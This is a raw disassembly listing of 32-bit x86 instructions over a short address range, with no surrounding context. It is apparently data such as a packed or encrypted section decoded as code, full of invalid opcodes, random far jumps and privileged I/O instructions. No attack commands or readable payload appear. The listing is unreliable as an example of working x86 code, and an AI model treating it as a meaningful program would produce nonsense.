  41b202:	sub    ecx,DWORD PTR [eax+eiz*2+0x15]
  41b206:	mov    dh,0x6
  41b208:	xchg   edx,eax
  41b209:	jmp    0xed2f:0xf1aa2696
  41b210:	jp     0x41b1a1
  41b212:	pop    esp
  41b213:	hlt    
  41b214:	pop    eax
  41b215:	lds    ecx,FWORD PTR [esi-0x382b3c9f]
  41b21b:	jo     0x41b272
  41b21d:	or     esp,ebx
  41b21f:	sbb    dl,BYTE PTR ds:0xcfe35299
  41b225:	fld    QWORD PTR [ebp+0x64c2a0f4]
  41b22b:	pop    eax
  41b22c:	adc    BYTE PTR [edx+0x18fb0a22],cl
  41b232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b233:	call   0xdab0:0xe46e53dd
  41b23a:	out    0x10,al
  41b23c:	mov    edi,0x826aaf9
  41b241:	add    bh,BYTE PTR [eax-0x52]
  41b244:	dec    ecx
  41b245:	bnd jmp 0x41b1d3
  41b248:	lods   eax,DWORD PTR ds:[esi]
  41b249:	test   DWORD PTR [bp+si-0x9c3],ebx
  41b24e:	add    cl,BYTE PTR gs:[edx-0x49]
  41b252:	push   ds
  41b253:	popa   
  41b254:	(bad)  
  41b255:	div    BYTE PTR [ebp-0x7e4709b5]
  41b25b:	mov    bl,0xa6
  41b25d:	inc    eax
  41b25e:	push   edx
  41b25f:	inc    ebp
  41b260:	jb     0x41b2a9
  41b262:	retf   0x1dbf
  41b265:	xor    eax,ebp
  41b267:	jp     0x41b289
  41b269:	mov    bh,0x29
  41b26b:	mov    ecx,ebp
  41b26d:	mov    ecx,0x9d038eb9
  41b272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b273:	fist   WORD PTR [edx-0x3d5a87a1]
  41b279:	call   0x33d2:0xbf996e75
  41b280:	cs sub al,0x96
  41b283:	leave  
  41b284:	into   
  41b285:	inc    edx
  41b286:	pop    ds
  41b287:	push   cs
  41b288:	dec    esi
  41b289:	xor    al,0xde
  41b28b:	cmc    
  41b28c:	rcr    edi,0xdc
  41b28f:	xor    BYTE PTR [edx-0xf74a330],0x6f
  41b296:	mov    esi,0x594d8da9
  41b29b:	adc    eax,0xb78d4ca9
  41b2a0:	mov    esp,0x5958dde3
  41b2a5:	xchg   DWORD PTR [esi-0x4a76950a],eax
  41b2ab:	mov    dh,0x97
  41b2ad:	fs or  eax,0x4578efd0
  41b2b3:	addr16 mov bl,0x56
  41b2b6:	xchg   esi,eax
  41b2b7:	cmp    DWORD PTR cs:[edi-0x6b4538f4],0xbdbf449e
  41b2c2:	xchg   edx,eax
  41b2c3:	fcom   DWORD PTR [ecx-0x6150def0]
  41b2c9:	cmc    
  41b2ca:	fild   DWORD PTR [edi+0x7f4d7adc]
  41b2d0:	push   cs
  41b2d1:	xor    ebx,DWORD PTR [esi+0x1b]
  41b2d4:	and    al,BYTE PTR [ecx+0x7a55c98f]
  41b2da:	mov    dh,0x7
  41b2dc:	adc    eax,0x7701323c
  41b2e1:	mov    bl,0xd6
  41b2e3:	cmc    
  41b2e4:	inc    ebp
  41b2e5:	mov    ch,0xf3
  41b2e7:	cmp    ah,BYTE PTR ds:0xf0fcff5d
  41b2ed:	inc    esi
  41b2ee:	enter  0xe54e,0x8c
  41b2f2:	fadd   DWORD PTR [edi-0x65]
  41b2f5:	lea    esi,[ebx]
  41b2f7:	mov    WORD PTR [ebx+0x5fd32e1b],ss
  41b2fd:	mov    al,0x2f
  41b2ff:	pusha  
  41b300:	push   0x5e8ce583
  41b305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b306:	lds    ecx,FWORD PTR [ebp+0x4d]
  41b309:	dec    ebp
  41b30a:	sbb    al,0xd2
  41b30c:	add    BYTE PTR [ebx-0x3135f5d8],dl
  41b312:	push   0xc372eadc
  41b317:	adc    esi,DWORD PTR [esi+0x11]
  41b31a:	retf   
  41b31b:	dec    esp
  41b31c:	jmp    0x41b2a2
  41b31e:	adc    eax,0x211d1a6d
  41b323:	les    esp,FWORD PTR [edi-0x72]
  41b326:	dec    BYTE PTR [ebx+edx*8-0x7f]
  41b32a:	cmp    ebx,DWORD PTR [edx+0x3633802b]
  41b330:	mov    ch,0x92
  41b332:	in     eax,0x50
  41b334:	loop   0x41b319
  41b336:	test   eax,0x9004e1e0
  41b33b:	cs sbb DWORD PTR es:[bp+di],edi
  41b340:	fcmovnbe st,st(6)
  41b342:	xchg   esp,eax
  41b343:	push   ebp
  41b344:	clc    
  41b345:	sub    DWORD PTR ds:0x905acb2b,ebp
  41b34b:	push   esp
  41b34c:	aad    0x8a
  41b34e:	(bad)  
  41b34f:	cdq    
  41b350:	cmp    al,0xa5
  41b352:	call   DWORD PTR [edx-0x3a]
  41b355:	ins    DWORD PTR es:[edi],dx
  41b356:	xchg   esi,eax
  41b357:	jecxz  0x41b355
  41b359:	daa    
  41b35a:	setb   bh
  41b35d:	pop    esp
  41b35e:	inc    ebp
  41b35f:	ror    DWORD PTR [edi],cl
  41b361:	inc    edi
  41b362:	fstp   TBYTE PTR [ecx]
  41b364:	imul   esp,DWORD PTR [eax+0x37379721],0x59b05b9a
  41b36e:	cld    
  41b36f:	pop    ebp
  41b370:	pop    eax
  41b371:	xor    dh,BYTE PTR [esi]
  41b373:	pop    esp
  41b374:	in     eax,dx
  41b375:	mov    DWORD PTR [ebp+0x3e],edi
  41b378:	mov    ah,0x95
  41b37a:	ja     0x41b308
  41b37c:	shr    BYTE PTR [ebx+ebx*1-0x38],0x5b
  41b381:	call   0xa30f:0xb178e398
  41b388:	inc    BYTE PTR [ebp+0x23]
  41b38b:	dec    ebp
  41b38c:	mov    esp,DWORD PTR [esi+eax*4]
  41b38f:	pushf  
  41b390:	sbb    BYTE PTR [ebp+0x69df9ba1],cl
  41b396:	pop    ebp
  41b397:	lds    ebx,FWORD PTR [ecx-0x4d6a2f64]
  41b39d:	mov    dl,0xce
  41b39f:	mov    bh,0x8f
  41b3a1:	test   eax,eax
  41b3a3:	gs fsub st,st(0)
  41b3a6:	mov    ecx,0xf7ae8ac8
  41b3ab:	js     0x41b37d
  41b3ad:	call   0xb01b8c27
  41b3b2:	imul   edi,DWORD PTR [esi],0x4888de3
  41b3b8:	add    ebx,ecx
  41b3ba:	(bad)  
  41b3bc:	mov    esp,eax
  41b3be:	pop    eax
  41b3bf:	popf   
  41b3c0:	cwde   
  41b3c1:	mov    ch,BYTE PTR [ebx]
  41b3c3:	push   ss
  41b3c4:	adc    BYTE PTR [edx],dh
  41b3c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3c7:	pop    ebx
  41b3c8:	clc    
  41b3c9:	mov    esi,0x15393d31
  41b3ce:	leave  
  41b3cf:	xor    al,0xe7
  41b3d1:	push   es
  41b3d2:	and    BYTE PTR [edx-0x63],dh
  41b3d5:	sbb    al,BYTE PTR [ecx+0x2b]
  41b3d8:	sbb    cl,ah
  41b3da:	imul   ecx,DWORD PTR [esi],0x6b
  41b3dd:	and    al,0x32
  41b3df:	jg     0x41b3e7
  41b3e1:	imul   eax,edx,0x30f7781e
  41b3e7:	dec    eax
  41b3e8:	repz push ecx
  41b3ea:	scas   eax,DWORD PTR es:[edi]
  41b3eb:	call   0x767b:0x93ac2ba9
  41b3f2:	jecxz  0x41b46a
  41b3f4:	add    al,0x7f
  41b3f6:	or     DWORD PTR cs:[ebp+0xf632957],0xe0af7e3b
  41b401:	mov    dh,0xf2
  41b403:	das    
  41b404:	mov    eax,0xf8903247
  41b409:	adc    eax,0x181cb12a
  41b40e:	cli    
  41b40f:	xchg   ebx,eax
  41b410:	pushf  
  41b411:	inc    ecx
  41b412:	pop    esp
  41b413:	(bad)  
  41b414:	lods   al,BYTE PTR ds:[esi]
  41b415:	push   0x63
  41b417:	enter  0x3730,0x12
  41b41b:	push   cs
  41b41c:	scas   al,BYTE PTR es:[edi]
  41b41d:	jl     0x41b439
  41b41f:	pushf  
  41b420:	fadd   DWORD PTR [edx+0x12]
  41b423:	idiv   cl
  41b425:	adc    DWORD PTR [esi-0x13bd7f14],ebp
  41b42b:	mov    dl,0x1c
  41b42d:	pop    ebp
  41b42e:	fist   DWORD PTR [esi+0x756e79e0]
  41b434:	enter  0x64f4,0x63
  41b438:	jg     0x41b4a3
  41b43a:	push   eax
  41b43b:	lock xchg ebp,eax
  41b43d:	les    esi,FWORD PTR [esi]
  41b43f:	dec    ebx
  41b440:	fadd   QWORD PTR [esi-0x42ccb250]
  41b446:	scas   al,BYTE PTR es:[edi]
  41b447:	dec    ebp
  41b448:	pop    esp
  41b449:	jmp    0x41b3df
  41b44b:	loop   0x41b421
  41b44d:	xor    DWORD PTR [esi+0x5292afd7],eax
  41b453:	pop    esp
  41b454:	or     al,0xf
  41b456:	mov    esi,0x9ed88f48
  41b45b:	adc    bl,BYTE PTR [ebx]
  41b45d:	mov    edi,0xdf5852a7
  41b462:	lahf   
  41b463:	cmp    ch,BYTE PTR [edx]
  41b465:	mov    al,ds:0xe4980c70
  41b46a:	mov    ah,0xe2
  41b46c:	shl    BYTE PTR ds:0xc117be49,1
  41b472:	mov    edx,0xc7dc7d53
  41b477:	call   0xdc9d0b71
  41b47c:	call   0xe0c8:0x93830d19
  41b483:	mov    dh,0x57
  41b485:	lds    ecx,FWORD PTR [esi+0x192576df]
  41b48b:	mov    esi,0x6adde56f
  41b490:	jmp    0x32ee5dc9
  41b495:	adc    ebp,eax
  41b497:	shl    BYTE PTR [edi+ecx*4+0x6a65dadc],1
  41b49e:	lods   eax,DWORD PTR ds:[esi]
  41b49f:	lds    esi,FWORD PTR [ecx+eiz*8]
  41b4a2:	stc    
  41b4a3:	xor    BYTE PTR [edi+0x26],ah
  41b4a6:	lods   eax,DWORD PTR ds:[esi]
  41b4a7:	sbb    esi,ebp
  41b4a9:	sbb    eax,esp
  41b4ab:	retf   0x330f
  41b4ae:	xor    DWORD PTR [esi+edi*2-0x25597821],eax
  41b4b5:	sub    DWORD PTR [edi+0x574f4980],edi
  41b4bb:	retf   
  41b4bc:	arpl   WORD PTR [eax+0x68beacf5],cx
  41b4c2:	iret   
  41b4c3:	ror    esp,1
  41b4c5:	(bad)  
  41b4c6:	cmp    eax,0x365cb354
  41b4cb:	sbb    BYTE PTR [esi],ch
  41b4cd:	inc    ecx
  41b4ce:	mov    bl,0x85
  41b4d0:	ins    BYTE PTR es:[edi],dx
  41b4d1:	cs (bad) 
  41b4d3:	cmp    al,0xa
  41b4d5:	adc    al,0x1a
  41b4d7:	lahf   
  41b4d8:	popa   
  41b4d9:	enter  0x975d,0xe6
  41b4dd:	fdivr  QWORD PTR [ebx]
  41b4df:	pop    ecx
  41b4e0:	pop    ds
  41b4e1:	xor    ah,BYTE PTR [ebp-0x1c]
  41b4e4:	pop    esp
  41b4e5:	mov    edx,0x37296cf4
  41b4ea:	xchg   ecx,eax
  41b4eb:	ja     0x41b536
  41b4ed:	mov    ecx,edi
  41b4ef:	or     DWORD PTR ds:0x18a04bb3,edx
  41b4f5:	jmp    0xd935:0x28937501
  41b4fc:	enter  0x1093,0xb7
  41b500:	sub    al,0x78
  41b502:	in     al,dx
  41b503:	out    dx,eax
  41b504:	sub    eax,edx
  41b506:	in     al,0xd2
  41b508:	add    al,0x99
  41b50a:	inc    ebp
  41b50b:	jg     0x41b552
  41b50d:	mov    al,ds:0x895481be
  41b512:	sub    BYTE PTR [ebx+edx*8+0x35396253],0x58
  41b51a:	out    dx,al
  41b51b:	lea    ebp,[esi-0x77]
  41b51e:	int    0x90
  41b520:	les    edi,FWORD PTR [ebx]
  41b522:	add    eax,0x7953f28f
  41b527:	or     eax,0xaa60e4a6
  41b52c:	jbe    0x41b566
  41b52e:	mov    fs,WORD PTR [esi+edx*4]
  41b531:	xlat   BYTE PTR ds:[ebx]
  41b532:	xor    al,BYTE PTR [eax]
  41b534:	imul   edx,DWORD PTR [ebx+eax*1-0x50a4b216],0x68fde06b
  41b53f:	mov    edx,0x2721e2cc
  41b544:	sub    cl,bl
  41b546:	sbb    esp,0x4b
  41b549:	sub    eax,edx
  41b54b:	(bad)  
  41b54c:	std    
  41b54d:	iret   
  41b54e:	loop   0x41b5af
  41b550:	test   DWORD PTR [ecx-0x61],esi
  41b553:	call   0x5360d7f1
  41b558:	and    bl,BYTE PTR [ebx+0x42]
  41b55b:	mov    esp,0x35f61e74
  41b560:	(bad)  
  41b562:	cmp    BYTE PTR [edi+0x477ad002],cl
  41b568:	sbb    edi,DWORD PTR [ecx-0x5acdb223]
  41b56e:	sbb    edx,DWORD PTR [ebx-0x2a]
  41b571:	jnp    0x41b542
  41b573:	dec    esp
  41b574:	mov    WORD PTR [eax+0x29498862],fs
  41b57a:	mov    ah,BYTE PTR [ebx+0x28]
  41b57d:	cmc    
  41b57e:	inc    esi
  41b57f:	imul   edi,DWORD PTR [esi+0x19a45e57],0x44
  41b586:	add    DWORD PTR [esi],0x3f
  41b589:	int    0xf2
  41b58b:	enter  0x5315,0x73
  41b58f:	imul   ebp,DWORD PTR [ebx+0x494f3369],0xfa879712
  41b599:	dec    esi
  41b59a:	sbb    eax,0xbb1ba510
  41b59f:	inc    ecx
  41b5a0:	out    dx,al
  41b5a1:	sbb    esp,DWORD PTR [edi+0x7e]
  41b5a4:	in     al,dx
  41b5a5:	outs   dx,BYTE PTR ds:[esi]
  41b5a6:	fwait
  41b5a7:	sbb    al,0xfd
  41b5a9:	sub    dh,ch
  41b5ab:	push   eax
  41b5ac:	iret   
  41b5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5ae:	mov    DWORD PTR [eax+eax*4-0x2a],esp
  41b5b2:	sbb    DWORD PTR [esi],esp
  41b5b4:	test   DWORD PTR [esi+0x43c652c1],esp
  41b5ba:	into   
  41b5bb:	pop    eax
  41b5bc:	cmp    ebp,DWORD PTR [ecx+ecx*2+0x7080679b]
  41b5c3:	add    BYTE PTR [ecx+edi*2+0x7ba3a960],bh
  41b5ca:	ins    BYTE PTR es:[edi],dx
  41b5cb:	in     eax,dx
  41b5cc:	lea    edx,[esi]
  41b5ce:	arpl   WORD PTR [eax],dx
  41b5d0:	rcr    esi,0xbf
  41b5d3:	fidivr DWORD PTR [ebx-0x3e]
  41b5d6:	ss jae 0x41b59e
  41b5d9:	mov    ah,0xb0
  41b5db:	enter  0xedc6,0xeb
  41b5df:	push   eax
  41b5e0:	loope  0x41b573
  41b5e2:	jecxz  0x41b5fe
  41b5e4:	push   es
  41b5e5:	jbe    0x41b5fb
  41b5e7:	lods   eax,DWORD PTR ds:[esi]
  41b5e8:	add    eax,0xaa0ce1c4
  41b5ed:	in     eax,dx
  41b5ee:	cmp    al,0x83
  41b5f0:	and    dh,BYTE PTR [esi]
  41b5f2:	add    eax,0x268e95fa
  41b5f7:	test   BYTE PTR ds:0x1b0c524d,dh
  41b5fd:	or     edx,DWORD PTR [edi]
  41b5ff:	outs   dx,DWORD PTR ds:[esi]
  41b600:	mov    bl,0xd0
  41b602:	cmc    
  41b603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b604:	inc    eax
  41b605:	std    
  41b606:	xchg   ebp,eax
  41b607:	les    eax,FWORD PTR [ecx+0x7]
  41b60a:	push   ss
  41b60b:	daa    
  41b60c:	push   0x4e
  41b60e:	pop    edi
  41b60f:	jmp    0x85fc839a
  41b614:	or     ecx,DWORD PTR [ebx+edi*8]
  41b617:	dec    edx
  41b618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b619:	aam    0x1f
  41b61b:	xlat   BYTE PTR ds:[ebx]
  41b61c:	sub    BYTE PTR [ecx-0x4c9d1c91],0xdd
  41b623:	sub    dh,BYTE PTR [ebp-0x2601c3a2]
  41b629:	pop    ebx
  41b62a:	push   ecx
  41b62b:	add    ah,ah
  41b62d:	cmp    dh,BYTE PTR fs:[eax+0x6c]
  41b631:	dec    edx
  41b632:	add    esi,esp
  41b634:	adc    DWORD PTR [ecx],edx
  41b636:	xor    eax,0x55115bf6
  41b63b:	out    dx,al
  41b63c:	popa   
  41b63d:	cmp    BYTE PTR [esi-0x29],al
  41b640:	push   cs
  41b641:	push   ebp
  41b642:	fs or  al,0xda
  41b645:	add    DWORD PTR [ecx+0x62443886],esp
  41b64b:	sub    eax,0x58fe64b4
  41b650:	into   
  41b651:	in     eax,dx
  41b652:	lods   al,BYTE PTR ds:[esi]
  41b653:	out    0x1b,eax
  41b655:	mov    ebx,DWORD PTR [edi]
  41b657:	add    eax,0x84ac3346
  41b65c:	rcr    BYTE PTR [edi+0x7d],1
  41b65f:	xchg   BYTE PTR [edi],ah
  41b661:	cmp    ah,bh
  41b663:	out    0x75,eax
  41b665:	jl     0x41b6e1
  41b667:	sbb    BYTE PTR [edi+edx*8-0x49d5e5a1],ah
  41b66e:	dec    esp
  41b66f:	sbb    BYTE PTR [edi-0x47],0xd4
  41b673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b674:	repnz popf 
  41b676:	sub    BYTE PTR [eax+0x4f],bh
  41b679:	stc    
  41b67a:	nop
  41b67b:	inc    esp
  41b67c:	data16 fstp TBYTE PTR [ebp+ebp*8-0x51]
  41b681:	call   0x6507:0xa3638fdd
  41b688:	cs dec esi
  41b68a:	dec    edi
  41b68b:	and    ecx,DWORD PTR [edi-0x5c679a31]
  41b691:	icebp  
  41b692:	mov    cl,0x80
  41b694:	xchg   edi,eax
  41b695:	stos   BYTE PTR es:[edi],al
  41b696:	cmp    BYTE PTR [edx],cl
  41b698:	or     eax,edx
  41b69a:	dec    ebp
  41b69b:	push   esp
  41b69c:	cmp    ebx,ecx
  41b69e:	es sti 
  41b6a0:	iret   
  41b6a1:	in     al,0x73
  41b6a3:	fabs   
  41b6a5:	mov    esp,DWORD PTR [edx]
  41b6a7:	fisub  WORD PTR [ebp+0x4396d055]
  41b6ad:	fild   DWORD PTR [ebx+0x29]
  41b6b0:	cdq    
  41b6b1:	pop    bp
  41b6b3:	retf   0xaab6
  41b6b6:	xchg   esi,eax
  41b6b7:	jmp    0x6c8c:0x7851618b
  41b6be:	pop    esp
  41b6bf:	pop    ebx
  41b6c0:	inc    esi
  41b6c1:	mov    WORD PTR [eax],ss
  41b6c3:	add    al,0xc6
  41b6c5:	shl    BYTE PTR [eax+0x15],cl
  41b6c8:	push   es
  41b6c9:	in     eax,0x66
  41b6cb:	in     al,0x80
  41b6cd:	cmp    al,0xac
  41b6cf:	call   0x59bc:0x11eff8da
  41b6d6:	cld    
  41b6d7:	inc    ecx
  41b6d8:	push   0x6471447f
  41b6dd:	call   0xb5b8:0x4fbf875f
  41b6e4:	pushf  
  41b6e5:	inc    eax
  41b6e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6e7:	mov    esi,0x8f37291f
  41b6ec:	and    al,0x16
  41b6ee:	push   ebp
  41b6ef:	or     al,0x68
  41b6f1:	jnp    0x41b69a
  41b6f3:	(bad)  
  41b6f4:	and    BYTE PTR [esi],ah
  41b6f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6f7:	outs   dx,BYTE PTR ds:[esi]
  41b6f8:	or     ebp,DWORD PTR [ebp+ebp*2-0x10]
  41b6fc:	rol    DWORD PTR [ebx*4-0x389b9d93],cl
  41b703:	mov    esp,0xe7fb04e8
  41b708:	mov    ecx,0xc52e2b
  41b70d:	and    ch,BYTE PTR es:[ecx]
  41b710:	jae    0x41b6e2
  41b712:	sti    
  41b713:	fnstcw WORD PTR [esi]
  41b715:	repnz fist DWORD PTR [ebx]
  41b718:	lock adc DWORD PTR [ecx],ecx
  41b71b:	outs   dx,BYTE PTR ds:[esi]
  41b71c:	rcr    DWORD PTR [ecx-0x5f],cl
  41b71f:	push   ebp
  41b720:	jp     0x41b76d
  41b722:	fbstp  TBYTE PTR gs:[ecx]
  41b725:	push   ebp
  41b726:	mov    al,0x4a
  41b728:	test   eax,0x3075d019
  41b72d:	jne    0x41b786
  41b72f:	pop    esi
  41b730:	sub    al,0xe6
  41b732:	pop    ds
  41b733:	test   DWORD PTR [eax+0x5f],eax
  41b736:	mov    ecx,0x3e51465a
  41b73b:	sar    BYTE PTR [edi],cl
  41b73d:	sbb    DWORD PTR ds:0x230ccf26,0x81418e10
  41b747:	scas   eax,DWORD PTR es:[edi]
  41b748:	push   ebx
  41b749:	jbe    0x41b74a
  41b74b:	lods   al,BYTE PTR ds:[esi]
  41b74c:	cmp    BYTE PTR [ebx-0x25185b6c],dh
  41b752:	mov    ecx,0xda55018d
  41b757:	dec    edx
  41b758:	rcl    BYTE PTR [edx+0x2b00e6d5],cl
  41b75e:	repnz movs BYTE PTR es:[di],BYTE PTR ds:[si]
  41b761:	jb     0x41b791
  41b763:	pop    ss
  41b764:	imul   dl
  41b766:	adc    eax,DWORD PTR [edi+esi*8-0x23]
  41b76a:	xchg   esp,eax
  41b76b:	dec    edi
  41b76c:	or     ebx,ecx
  41b76e:	dec    edi
  41b76f:	test   eax,esp
  41b771:	sbb    ch,BYTE PTR [eax]
  41b773:	into   
  41b774:	call   0x20d:0x1ce6ca46
  41b77b:	std    
  41b77c:	mov    ebx,0x353da4c
  41b781:	popf   
  41b782:	mov    eax,ds:0x945164e5
  41b787:	lods   al,BYTE PTR ds:[esi]
  41b788:	scas   al,BYTE PTR es:[edi]
  41b789:	mov    bh,0xac
  41b78b:	inc    esp
  41b78c:	mov    cl,0x9e
  41b78e:	inc    edx
  41b78f:	or     al,0xdc
  41b791:	dec    edx
  41b792:	ret    0x56b7
  41b795:	call   0x6ec3c33
  41b79a:	pop    edi
  41b79b:	outs   dx,BYTE PTR ds:[esi]
  41b79c:	lods   eax,DWORD PTR ds:[esi]
  41b79d:	mov    edi,0x92e65265
  41b7a2:	retf   0x57e7
  41b7a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7a6:	add    BYTE PTR [ebx],dl
  41b7a8:	std    
  41b7a9:	outs   dx,BYTE PTR ds:[esi]
  41b7aa:	sbb    DWORD PTR [edi-0x736615e4],ecx
  41b7b0:	mov    ds:0x96eda888,al
  41b7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b6:	lea    esp,[edi-0x2c]
  41b7b9:	pop    edx
  41b7ba:	(bad)  
  41b7bb:	daa    
  41b7bc:	pop    esp
  41b7bd:	(bad)  
  41b7be:	rcr    DWORD PTR ds:0x75f4fab3,1
  41b7c4:	and    eax,0x3e8c1747
  41b7c9:	add    BYTE PTR [si],bl
  41b7cc:	inc    ecx
  41b7cd:	rol    DWORD PTR [edi],1
  41b7cf:	sub    BYTE PTR [edi],dh
  41b7d1:	push   eax
  41b7d2:	sub    al,cl
  41b7d4:	xchg   esi,eax
  41b7d5:	xchg   esp,eax
  41b7d6:	cmp    eax,0xdc1846f6
  41b7db:	jl     0x41b857
  41b7dd:	cmp    bh,BYTE PTR ds:0xde52ef5d
  41b7e3:	add    eax,0xb1928219
  41b7e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7e9:	dec    ebx
  41b7ea:	call   0x718b:0xe7c149dd
  41b7f1:	or     ebx,DWORD PTR [ebp+0x35]
  41b7f4:	xchg   ecx,eax
  41b7f5:	push   cs
  41b7f6:	add    esp,DWORD PTR [ecx-0x2e60e729]
  41b7fc:	lods   al,BYTE PTR ds:[esi]
  41b7fd:	inc    esp
  41b7fe:	stos   BYTE PTR es:[edi],al
  41b7ff:	out    0xb6,eax
  41b801:	leave  
  41b802:	clc    
  41b803:	mov    edx,0x75a2e212
  41b808:	jp     0x41b878
  41b80a:	mov    al,0xc6
  41b80c:	mov    al,ds:0x3471bd71
  41b811:	adc    eax,0x5d0fe551
  41b816:	and    DWORD PTR [ecx],edx
  41b818:	sbb    al,dh
  41b81a:	lea    ebp,[esi+edx*2]
  41b81d:	or     ebx,eax
  41b81f:	aas    
  41b820:	sar    esp,1
  41b822:	dec    esp
  41b823:	js     0x41b876
  41b825:	data16 scas al,BYTE PTR es:[edi]
  41b827:	clc    
  41b828:	sub    al,0x5c
  41b82a:	mov    edx,0xcbdf6b1c
  41b82f:	adc    BYTE PTR [eax-0x32],bl
  41b832:	sar    DWORD PTR [edx+0x4a],1
  41b835:	lods   al,BYTE PTR ds:[esi]
  41b836:	xchg   BYTE PTR [ebx],al
  41b838:	mov    ebp,0x119e839
  41b83d:	jnp    0x41b7f2
  41b83f:	mov    edx,0xed7f5574
  41b844:	aam    0x95
  41b846:	mov    cl,0xef
  41b848:	mov    eax,ds:0xff84f33d
  41b84d:	call   0x9f1a5c6
  41b852:	les    ebx,FWORD PTR [ebx+0x6643d37d]
  41b858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b859:	or     ecx,esp
  41b85b:	call   0x79cc:0xb345edfc
  41b862:	aad    0x11
  41b864:	mov    esi,0xd84dfc5
  41b869:	pop    es
  41b86a:	je     0x41b84a
  41b86c:	stos   DWORD PTR es:[edi],eax
  41b86d:	popf   
  41b86e:	popa   
  41b86f:	dec    edx
  41b870:	dec    ebp
  41b871:	inc    edx
  41b872:	nop
  41b873:	shr    BYTE PTR [ebx],0xb7
  41b876:	stos   BYTE PTR es:[edi],al
  41b877:	in     eax,0xfb
  41b879:	lahf   
  41b87a:	out    dx,al
  41b87b:	sbb    al,0x61
  41b87d:	in     eax,0x5
  41b87f:	sbb    ebp,DWORD PTR [edx-0x7d]
  41b882:	repnz or al,0xca
  41b885:	loope  0x41b83f
  41b887:	adc    al,0xe9
  41b889:	dec    ebx
  41b88a:	adc    DWORD PTR [esi*1-0x6958e5b1],edi
  41b891:	dec    esp
  41b892:	rcl    BYTE PTR [ebp+0x44],1
  41b895:	xchg   esi,eax
  41b896:	retf   0xdc5f
  41b899:	loop   0x41b85b
  41b89b:	in     eax,dx
  41b89c:	call   edx
  41b89e:	sbb    DWORD PTR [ecx+0x397ce15d],ebx
  41b8a4:	mov    ds:0x71cd5637,eax
  41b8a9:	mov    dh,0x36
  41b8ab:	sub    esp,DWORD PTR [ebp-0x29]
  41b8ae:	xor    DWORD PTR [edi],ebx
  41b8b0:	jl     0x41b8af
  41b8b2:	retf   0x3b2
  41b8b5:	fcmovnu st,st(2)
  41b8b7:	lods   eax,DWORD PTR ds:[esi]
  41b8b8:	rcr    DWORD PTR [eax-0x32],0xdb
  41b8bc:	jecxz  0x41b8e4
  41b8be:	inc    edi
  41b8bf:	pop    edi
  41b8c0:	pop    ebx
  41b8c1:	xlat   BYTE PTR ds:[ebx]
  41b8c2:	mov    al,ds:0x38cf741a
  41b8c7:	loope  0x41b8e0
  41b8c9:	aas    
  41b8ca:	ins    DWORD PTR es:[edi],dx
  41b8cb:	in     eax,dx
  41b8cc:	mov    dh,0x1b
  41b8ce:	add    ebp,DWORD PTR [ecx+ebp*8-0x42]
  41b8d2:	jbe    0x41b91f
  41b8d4:	mov    cl,0x4a
  41b8d6:	xor    esi,DWORD PTR [ebx]
  41b8d8:	jmp    0xa2d:0x4b535502
  41b8df:	adc    ah,bh
  41b8e1:	pop    esi
  41b8e2:	aad    0x12
  41b8e4:	fstp   st(1)
  41b8e6:	pop    ss
  41b8e7:	setne  dl
  41b8ea:	sbb    edx,DWORD PTR [edx]
  41b8ec:	inc    eax
  41b8ed:	and    edi,edi
  41b8ef:	lea    edi,[esi+0xc]
  41b8f2:	mov    bl,0x16
  41b8f4:	bound  eax,QWORD PTR [ebx-0x50b667d4]
  41b8fa:	dec    ecx
  41b8fb:	daa    
  41b8fc:	pop    esp
  41b8fd:	rcr    DWORD PTR [esi],1
  41b8ff:	jge    0x41b8d0
  41b901:	and    edi,DWORD PTR [edi]
  41b903:	mov    es,WORD PTR [esi+0x62]
  41b906:	test   al,0x9a
  41b908:	or     al,BYTE PTR [edi]
  41b90a:	jp     0x41b890
  41b90c:	adc    DWORD PTR [ecx+0x3aeee9f0],0xb9b2ed86
  41b916:	out    dx,al
  41b917:	repnz dec edx
  41b919:	push   ecx
  41b91a:	icebp  
  41b91b:	adc    eax,0x93406448
  41b920:	dec    edx
  41b921:	pop    ebp
  41b922:	int3   
  41b923:	imul   ecx,DWORD PTR [ebp-0x25720a08],0x21c2bf01
  41b92d:	retf   
  41b92e:	sbb    BYTE PTR ss:[ebx-0x6cf554b2],ah
  41b935:	fisttp QWORD PTR [edx]
  41b937:	popa   
  41b938:	ror    DWORD PTR [ebx+eax*8+0x2531b1ed],cl
  41b93f:	ins    BYTE PTR es:[edi],dx
  41b940:	popa   
  41b941:	add    DWORD PTR [edx+0x3b5fa212],ecx
  41b947:	fwait
  41b948:	test   al,0xe3
  41b94a:	mov    fs,WORD PTR [ebx-0x13]
  41b94d:	outs   dx,DWORD PTR ds:[esi]
  41b94e:	int3   
  41b94f:	fwait
  41b950:	enter  0x54f0,0xfc
  41b954:	sbb    DWORD PTR [edx-0x6dfde254],edx
  41b95a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b95b:	in     al,dx
  41b95c:	(bad)  
  41b95d:	lods   al,BYTE PTR ds:[esi]
  41b95e:	arpl   WORD PTR [ecx+0x65],ax
  41b961:	ja     0x41b9cf
  41b963:	mov    ebx,0xd3cde0ed
  41b968:	stc    
  41b969:	sbb    BYTE PTR cs:[esi-0x72475d7d],dl
  41b970:	cmp    al,0x30
  41b972:	sub    BYTE PTR cs:[edx+0x72],0xec
  41b977:	mov    WORD PTR [esi+0x43],es
  41b97a:	mov    al,ds:0xe349caa3
  41b97f:	jns    0x41b901
  41b981:	inc    esi
  41b982:	adc    dl,BYTE PTR [ebx-0x6fcaeca9]
  41b988:	xlat   BYTE PTR ds:[ebx]
  41b989:	dec    esi
  41b98a:	cmp    eax,0x19333dd7
  41b98f:	pop    ds
  41b990:	shr    esp,cl
  41b992:	out    0xd5,al
